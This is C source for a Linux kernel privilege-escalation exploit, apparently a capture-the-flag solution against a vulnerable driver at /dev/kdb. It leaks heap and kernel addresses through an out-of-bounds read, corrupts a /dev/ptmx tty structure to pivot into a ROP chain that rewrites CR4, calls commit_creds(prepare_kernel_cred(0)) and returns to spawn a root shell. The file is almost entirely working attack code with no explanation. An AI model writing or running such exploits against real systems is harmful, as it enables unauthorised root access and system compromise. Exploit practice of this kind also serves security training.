#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>


#define COMMAD_ALLOC 0x13371338
#define COMMAD_READ  0x13371339
#define COMMAD_WRITE 0x1337133A
#define COMMAD_FREE  0x1337133D
#define COMMAD_RALLO 0x1337133F

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif


char buf[0x2000];

char tty_str[0x2000];


struct Chunk{
    char name[0x20];
    unsigned long size;
};

struct Chunk2{
    char name[0x20];
    char* buf;
    unsigned long size;
};


typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;


unsigned long user_cs, user_ss, user_rflags;
unsigned long base;
unsigned long lower_addr;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void get_shell()

{

    system("/bin/sh");

}



static void shellcode()
{
    
    commit_creds(prepare_kernel_cred(0));
    asm(
        "swapgs\n"
        "movq %0,%%rax\n"    // push things into stack for iretq
        "pushq %%rax\n"
        "movq %1,%%rax\n"
        "pushq %%rax\n"
        "movq %2,%%rax\n"
        "pushq %%rax\n"
        "movq %3,%%rax\n"
        "pushq %%rax\n"
        "movq %4,%%rax\n"
        "pushq %%rax\n"
        "iretq\n"
        :
        :"r"(user_ss),"r"(base+0x500),"r"(user_rflags),"r"(user_cs),"r"(get_shell)
        :"memory"
    );
}



void hexdump(void *mem, unsigned int len)
{
        unsigned int i, j;
        
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
        {
                /* print offset */
                if(i % HEXDUMP_COLS == 0)
                {
                        printf("0x%06x: ", i);
                }
 
                /* print hex data */
                if(i < len)
                {
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                }
                else /* end of block, just aligning for ASCII dump */
                {
                        printf("   ");
                }
                
                /* print ASCII dump */
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
                {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
                        {
                                if(j >= len) /* end of block, not really printing */
                                {
                                        putchar(' ');
                                }
                                else if(isprint(((char*)mem)[j])) /* printable char */
                                {
                                        putchar(0xFF & ((char*)mem)[j]);        
                                }
                                else /* other char */
                                {
                                        putchar('.');
                                }
                        }
                        putchar('\n');
                }
        }
}

int main(){
    int fd = open("/dev/kdb",O_RDWR);
    struct Chunk ch1;
    struct Chunk *ptr1;
    struct Chunk2 ch2;
    struct Chunk2 *ptr2;

    ch1.size = 0x2e0;
    strcpy(ch1.name,"AAAABBBBCCCC");
    ioctl(fd,COMMAD_ALLOC,&ch1);

    ch2.size = 0xFFFFFFFFFFFFFFFF;
    strcpy(buf,"TTTTTTTTTTTTTTTT");
    ch2.buf = &buf;

    strcpy(ch2.name,"AAAABBBBCCCC");
    ioctl(fd,COMMAD_RALLO,&ch2);

    ch2.size = 0x2e0;
    int fd2 = open("/dev/ptmx", O_RDWR);

    ioctl(fd, COMMAD_READ,&ch2);

    // long *ptr = &buf;

    // for(int i=0;i<(0x2e0/8); i++)
    // {
    //   printf("%p\n", ptr );
    //   ptr++;
    // }
    save_state();

    unsigned long heap_leak = *(void **)(buf+16);
    unsigned long kernel_leak = *(void **)(buf + 24) ;
    unsigned long heap_chunk = heap_leak + 0x10600;
    printf("HEAP LEAK %p, KERNEL %p, HEAP CHUNK %p\n", heap_leak, kernel_leak,heap_chunk);

    commit_creds = kernel_leak - 0x1deb00;
    prepare_kernel_cred = kernel_leak - 0x1ded00;
    unsigned long xeaxespret = kernel_leak - 0x21be16;

    printf("commit_creds: %p , prepare_kernel_cred: %p\n", commit_creds,prepare_kernel_cred);
    unsigned long poprax = kernel_leak - 0x1ee41c;
    unsigned long crprep = kernel_leak - 0x213620;
    
    unsigned long poprdi = kernel_leak - 0x179ad3;
    unsigned long swapgs = kernel_leak - 0xdd648;

    lower_addr = xeaxespret & 0xFFFFFFFF;
    base = lower_addr & ~0xfff;

    struct Chunk ch3;
    struct Chunk *ptr3;
    struct Chunk2 ch4;
    struct Chunk2 *ptr4;

    ch3.size = 0x200;
    strcpy(ch3.name, "GGGGHHHHIIII");
    ioctl(fd, COMMAD_ALLOC, &ch3);

    ch4.size = 0x200;
    strcpy(ch4.name, "GGGGHHHHIIII");

    if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
    {
        perror("mmap");
        exit(1);
    }

    char rop[0x100];
    strcpy(rop,"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRR");
    *(void **)(rop + 0x8a) = poprax;
    *(void **)(rop + 0x8a + 8) = 0x6f0;
    *(void **)(rop + 0x8a + 16) = crprep;
    *(void **)(rop + 0x8a + 24) = base+0x1000;
    *(void **)(rop + 0x8a + 32) = shellcode;
    memcpy(base,rop,0x100);

    ch4.buf = &tty_str;
    strcpy(ch4.buf, "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRR");
    *(void **)(ch4.buf + 96) = xeaxespret;
    ioctl(fd,COMMAD_WRITE,&ch4);

    *(void **)(buf + 24) = heap_chunk;

    ioctl(fd, COMMAD_WRITE, &ch2);


    ioctl(fd2, 0x1, 0x1);

}
